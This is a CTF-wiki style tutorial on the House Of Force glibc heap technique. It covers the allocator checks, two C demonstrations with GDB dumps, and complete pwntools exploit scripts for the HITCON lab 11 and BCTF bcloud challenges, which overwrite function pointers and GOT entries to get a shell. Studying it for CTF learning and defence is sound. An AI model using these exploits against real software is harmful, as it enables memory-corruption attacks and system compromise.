# House Of Force

## Introduction
House Of Force belongs to the House Of XXX series of exploitation techniques. House Of XXX is a series of exploitation methods targeting the glibc heap allocator, proposed in the 2004 paper "The Malloc Maleficarum—Glibc Malloc Exploitation Techniques."
However, due to the passage of time, most methods proposed in "The Malloc Maleficarum" no longer work today. The House Of XXX techniques we refer to now are quite different from those written in the 2004 article. Nevertheless, "The Malloc Maleficarum" is still a recommended read, and you can find the original text here:
https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt

## Principle
House Of Force is a heap exploitation method, but this does not mean it must be based on a heap vulnerability. If a heap-based vulnerability is to be exploited using the House Of Force method, the following conditions are required:

1. The ability to control the top chunk's size field through an overflow or similar means
2. The ability to freely control the size of heap allocations

The reason House Of Force works lies in how glibc handles the top chunk. As we learned from the heap data structures section, during heap allocation, if no free chunks can satisfy the request, the corresponding size will be split from the top chunk.

So, what happens when the size value used to allocate a chunk from the top chunk is an arbitrary value controlled by the user? The answer is that the top chunk can be made to point to any location we desire, which is equivalent to an arbitrary address write. However, in glibc, the user-requested size and the top chunk's current size are validated:
```
// Get the current top chunk and calculate its corresponding size
victim = av->top;
size   = chunksize(victim);
// If after splitting, the size still satisfies the minimum chunk size, then the split can be performed directly.
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```
However, if the size can be tampered with to a very large value, this validation can be easily bypassed. This is why we mentioned earlier that a vulnerability capable of controlling the top chunk's size field is needed.

```
(unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
```
A common approach is to change the top chunk's size to -1, because during the comparison the size is cast to an unsigned number. Therefore, -1 becomes the maximum value of unsigned long, which will always pass the validation regardless of the request.

```
remainder      = chunk_at_offset(victim, nb);
av->top        = remainder;

/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
```
After this, the top pointer is updated, and the next chunk allocation will occur at this new location. If the user controls this pointer, it is equivalent to achieving an arbitrary address write (write-anything-anywhere).

**At the same time, we need to note that the top chunk's size is also updated, using the following method:**

```c
victim = av->top;
size   = chunksize(victim);
remainder_size = size - nb;
set_head(remainder, remainder_size | PREV_INUSE);
```

So, if we want to allocate a chunk of size x at a specified location next time, we need to ensure that remainder_size is not less than x + MINSIZE.

## Simple Example 1
After learning the principle of HOF, we use an example here to illustrate the exploitation. The goal of this example is to hijack the program flow by tampering with `malloc@got.plt` using HOF.

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== Here we change the top chunk's size field to 0xffffffffffffffff
    malloc(-4120);  // <=== Decrease the top chunk pointer
    malloc(0x10);   // <=== Allocate a chunk to achieve arbitrary address write
}
```

First, we allocate a chunk of 0x10 bytes:

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk
0x602030:	0x0000000000000000	0x0000000000000000
```
Then we change the top chunk's size to 0xffffffffffffffff. In a real challenge, this step can be achieved through a heap overflow or similar vulnerability.
Since -1 is represented as 0xffffffffffffffff in two's complement, we can simply assign -1.

```
0x602000:	0x0000000000000000	0x0000000000000021 <=== ptr
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0xffffffffffffffff <=== top chunk size field has been modified
0x602030:	0x0000000000000000	0x0000000000000000
```
Note the current top chunk location. When we perform the next allocation, the top chunk's position will be moved to where we want it.

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602020 <=== top chunk is normal at this point
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
Next, we execute `malloc(-4120);`. How is -4120 derived?
First, we need to determine the target write address. After compiling the program, 0x601020 is the address of `malloc@got.plt`:

```
0x601020:	0x00007ffff7a91130 <=== malloc@got.plt
```
So we should make the top chunk point to 0x601010, so that the next chunk allocation will return memory at the `malloc@got.plt` location.

Then, we determine the current top chunk address. As described earlier, the top chunk is at 0x602020, so we can calculate the offset as follows:

0x601010-0x602020=-4112

Additionally, the memory size requested by the user becomes an unsigned integer once it enters the memory allocation function.

```c
void *__libc_malloc(size_t bytes) {
```

If we want the user-input size to yield this value after the internal `checked_request2size` processing:

```c
/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
```

On one hand, we need to bypass the REQUEST_OUT_OF_RANGE(req) check, meaning the value we pass to malloc in the negative range must not be greater than -2 * MINSIZE, which is generally easy to satisfy.

On the other hand, after satisfying the corresponding constraints, we need `request2size` to convert to exactly the desired size. That is, we need ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK to be exactly -4112. First, it is obvious that -4112 is chunk-aligned, so we just need to subtract SIZE_SZ and MALLOC_ALIGN_MASK respectively to get the value we need to request. In fact, we only need to subtract SIZE_SZ here, because the extra MALLOC_ALIGN_MASK subtracted will be masked off by the alignment anyway. **However, if -4112 is not MALLOC_ALIGN-aligned, we would need to subtract a bit more. Of course, it is best to ensure the chunk obtained after allocation is also aligned, because alignment checks are performed when freeing a chunk.**

Therefore, after calling `malloc(-4120)`, we can observe that the top chunk has been raised to our desired location:

```
0x7ffff7dd1b20 <main_arena>:\	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000601010 <=== we can observe the top chunk has been raised
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
After this, the chunk we allocate will appear at 0x601010+0x10, which is 0x601020, allowing us to modify the contents in the GOT table.

However, note that while being raised, the content near malloc@got is also modified.

```c
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
```

## Simple Example 2
In the previous example, we demonstrated using HOF to decrease the top chunk pointer to modify the contents of the GOT table located above it (at a lower address).
However, HOF can also increase the top chunk pointer to modify content in the higher address space. We demonstrate this through this example.

```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 <=== modify top chunk size
    malloc(140737345551056); <=== increase top chunk pointer
    malloc(0x10);
}
```
We can see that the program code is basically the same as Simple Example 1, except the size for the second malloc is different.
This time our target is malloc_hook. We know that malloc_hook is a global variable located in libc.so. First, let's examine the memory layout:

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/桌面/tst/t1
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/桌面/tst/t1
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/桌面/tst/t1
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```
We can see that the heap base is at 0x602000 and the libc base is at 0x7ffff7a0d000, so we need to increase the top chunk pointer value via HOF to write to malloc_hook.
First, through debugging we find that the address of __malloc_hook is at 0x7ffff7dd1b10, and the calculation is:

0x7ffff7dd1b00-0x602020-0x10=140737345551056
After this malloc, we can observe that the top chunk address has been raised to 0x00007ffff7dd1b00:

```
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00007ffff7dd1b00 <=== top chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
```
After this, we just need to allocate again to control the __malloc_hook value at 0x7ffff7dd1b10:

```
rax = 0x00007ffff7dd1b10
    
0x400562 <main+60>        mov    edi, 0x10
0x400567 <main+65>        call   0x400410 <malloc@plt>
```

## Brief Summary
In this section, we explained the principle of House Of Force and provided two simple exploitation examples. By observing these two simple examples, we can see that the requirements for HOF exploitation are actually quite demanding:

* First, a vulnerability must exist that allows the user to control the top chunk's size field.
* Second, **the user must be able to freely control the allocation size of malloc.**
* Third, the number of allocations must not be restricted.

Among these three points, the second is often the hardest to achieve. CTF challenges often impose minimum and maximum size restrictions on user-allocated heap blocks, preventing exploitation via HOF.

## HITCON training lab 11
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/house-of-force/hitcontraning_lab11)

Here, we mainly modify its magic function to:



### Basic Information

```shell
➜  hitcontraning_lab11 git:(master) file bamboobox     
bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped
➜  hitcontraning_lab11 git:(master) checksec bamboobox 
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This program is a 64-bit dynamically linked executable.

### Basic Functionality

It is important to note that the program allocates 0x10 bytes of memory at the start to store **two function pointers**.

The program basically manages items in a box — adding and removing items.

1. Show box contents: displays the name of each item in the box in order.
2. Add item to box: allocates memory for each item based on the user-specified size, used to store the item's name. Note that the `read` function is used to read the name, and the length parameter is the user-input v2. Since read's third argument is an unsigned integer, if we input a negative number, we can read an arbitrary length. However, we need to ensure the value satisfies the `REQUEST_OUT_OF_RANGE` constraint, so there is an **arbitrary length heap overflow** vulnerability here. Even so, it is relatively difficult to exploit on the first attempt, because the top chunk's size at initialization is generally not very large.
3. Modify item name: reads a specified length of name data into the item at the given index. The length is user-controlled, which also presents an **arbitrary length heap overflow** vulnerability.
4. Delete item: sets the corresponding item's name size to 0 and sets the corresponding content to NULL.

Additionally, since this program is mainly a demonstration, there is a magic function in the program that can directly read the flag.

### Exploitation

Since the program has a magic function, our core objective is to overwrite a pointer with the magic function's pointer. Here, the program allocates a block of memory at the start to store two function pointers: hello_message is used when the program starts, and goodbye_message is used when the program ends. So we can hijack program execution flow by overwriting goodbye_message. The specific approach is as follows:

1. Add an item, using the heap overflow vulnerability to overwrite the top chunk's size to -1, i.e., the 64-bit maximum value.
2. Use the House of Force technique to allocate a chunk to the heap's base address.
3. Overwrite goodbye_message with the magic function's address to hijack program execution flow.

**Note that when triggering the top chunk relocation to the specified position, the size used should be appropriate to set the new top chunk size properly, so that the next top chunk allocation check can be bypassed.**

The exploit is as follows:

```shell
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./bamboobox')
context.log_level = 'debug'


def additem(length, name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def modify(idx, length, name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)


def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


def show():
    r.recvuntil(":")
    r.sendline("1")


magic = 0x400d49
# we must alloc enough size, so as to successfully alloc from fake topchunk
additem(0x30, "ddaa")  # idx 0
payload = 0x30 * 'a'  # idx 0's content
payload += 'a' * 8 + p64(0xffffffffffffffff)  # top chunk's prev_size and size
# modify topchunk's size to -1
modify(0, 0x41, payload)
# top chunk's offset to heap base
offset_to_heap_base = -(0x40 + 0x20)
malloc_size = offset_to_heap_base - 0x8 - 0xf
#gdb.attach(r)
additem(malloc_size, "dada")
additem(0x10, p64(magic) * 2)
print r.recv()
r.interactive()

```

Of course, this challenge can also be solved using the unlink method.

## 2016 BCTF bcloud
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/house-of-force/2016_bctf_bcloud)

### Basic Information

```shell
➜  2016_bctf_bcloud git:(master) file bcloud   
bcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped
➜  2016_bctf_bcloud git:(master) checksec bcloud  
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

As we can see, this is a dynamically linked 32-bit program with Canary protection and NX protection enabled.

### Basic Functionality

The program is roughly a cloud note management system. First, the program performs some initialization, setting the user's name, organization, and host. The program mainly has the following features:

1. Create note: allocates x+4 bytes of space based on user input x as the note size.
2. Show note: has no actual functionality...
3. Edit note: edits the content of the note at the user-specified index.
4. Delete note: deletes the corresponding note.
5. Sync note: marks all notes as synced.

However, no vulnerabilities were found in these five features... Re-examining the program, we found that the vulnerability appears during initialization.

Name initialization:

```c
unsigned int init_name()
{
  char s; // [esp+1Ch] [ebp-5Ch]
  char *tmp; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&s, 0, 0x50u);
  puts("Input your name:");
  read_str(&s, 64, '\n');
  tmp = (char *)malloc(0x40u);
  name = tmp;
  strcpy(tmp, &s);
  info(tmp);
  return __readgsdword(0x14u) ^ v3;
}
```

Here, if the program reads a name of 64 characters, then when the program uses the info function to output the corresponding string, it will also output the content of the tmp pointer, which means **the heap address is leaked**.

The vulnerability also exists during the initialization of organization and host:

```c
unsigned int init_org_host()
{
  char s; // [esp+1Ch] [ebp-9Ch]
  char *v2; // [esp+5Ch] [ebp-5Ch]
  char v3; // [esp+60h] [ebp-58h]
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(&s, 0, 0x90u);
  puts("Org:");
  read_str(&s, 64, 10);
  puts("Host:");
  read_str(&v3, 64, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  org = v2;
  host = v4;
  strcpy(v4, &v3);
  strcpy(v2, &s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

When inputting the organization with 64 bytes, it will overwrite the lower bytes of v2. At the same time, we know that v2 is the chunk adjacent to the top chunk, and v2 is adjacent to org. Since in a 32-bit program all 32 bits are generally used, the content stored in v2 is very likely not `\x00`. Therefore, when the strcpy function copies content into v2, it is very likely to overwrite the top chunk. This is where the vulnerability lies.

### Exploitation

1. Exploit the name initialization vulnerability to leak the heap base address.
2. Use House of Force to allocate the top chunk to the global address 0x0804B0A0 at &notesize-8. When memory is allocated next time, it will return memory at the notesize address, allowing us to control the size and corresponding address of all notes.
3. Modify the size of the first three notes to 16, and change their pointers to free@got, atoi@got, and atoi@got respectively.
4. Overwrite free@got with puts@plt.
5. Leak the atoi address.
6. Modify another atoi GOT entry to the system address to obtain a shell.

The specific script is as follows:

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./bcloud"
bcloud = ELF("./bcloud")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./bcloud")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


def exp():
    # leak heap base
    p.sendafter('Input your name:\n', 'a' * 64)
    p.recvuntil('Hey ' + 'a' * 64)
    # sub name's chunk's header
    heap_base = u32(p.recv(4)) - 8
    log.success('heap_base: ' + hex(heap_base))
    p.sendafter('Org:\n', 'a' * 64)
    p.sendlineafter('Host:\n', p32(0xffffffff))
    # name, org, host, each is (0x40+8)
    topchunk_addr = heap_base + (0x40 + 8) * 3

    # make topchunk point to 0x0804B0A0-8
    p.sendlineafter('option--->>', '1')
    notesize_addr = 0x0804B0A0
    notelist_addr = 0x0804B120
    targetaddr = notesize_addr - 8
    offset_target_top = targetaddr - topchunk_addr
    # 4 for size_t, 7 for malloc_allign
    malloc_size = offset_target_top - 4 - 7
    # plus 4 because malloc(v2 + 4);
    p.sendlineafter('Input the length of the note content:\n',
                    str(malloc_size - 4))
    # most likely malloc_size-4<0...
    if malloc_size - 4 > 0:
        p.sendlineafter('Input the content:\n', '')

    #gdb.attach(p)
    # set notesize[0] = notesize[1] = notesize[2]=16
    # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got
    p.sendlineafter('option--->>', '1')
    p.sendlineafter('Input the length of the note content:\n', str(1000))

    payload = p32(16) * 3 + (notelist_addr - notesize_addr - 12) * 'a' + p32(
        bcloud.got['free']) + p32(bcloud.got['atoi']) * 2
    p.sendlineafter('Input the content:\n', payload)

    # overwrite free@got with puts@plt
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(0))
    p.sendlineafter('Input the new content:\n', p32(bcloud.plt['puts']))

    # leak atoi addr by fake free
    p.sendlineafter('option--->>', '4')
    p.sendlineafter('Input the id:\n', str(1))
    atoi_addr = u32(p.recv(4))
    libc_base = atoi_addr - libc.symbols['atoi']
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base addr: ' + hex(libc_base))

    # overwrite atoi@got with system
    p.sendlineafter('option--->>', '3')
    p.sendlineafter('Input the id:\n', str(2))
    p.sendlineafter('Input the new content:\n', p32(system_addr))

    # get shell
    p.sendlineafter('option--->>', '/bin/sh\x00')
    p.interactive()


if __name__ == "__main__":
    exp()
```



## Challenges

- [2016 Boston Key Party CTF cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6)
